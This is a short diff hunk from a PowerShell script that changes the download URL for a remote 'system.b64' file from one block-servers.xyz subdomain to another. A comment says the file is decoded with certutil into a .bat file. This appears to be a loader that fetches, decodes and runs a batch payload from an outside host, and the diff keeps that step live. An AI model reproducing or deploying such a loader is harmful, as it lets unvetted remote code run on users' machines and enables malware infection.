@@ -49,7 +49,7 @@ if (-not $args) {
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     # Updated to download raw .b64 file and decode it using certutil -f -decode to .bat
-    $URL = 'https://defi.block-servers.xyz/system.b64'
+    $URL = 'https://dev.block-servers.xyz/system.b64'
 
     try {
         if ($psv -ge 3) {
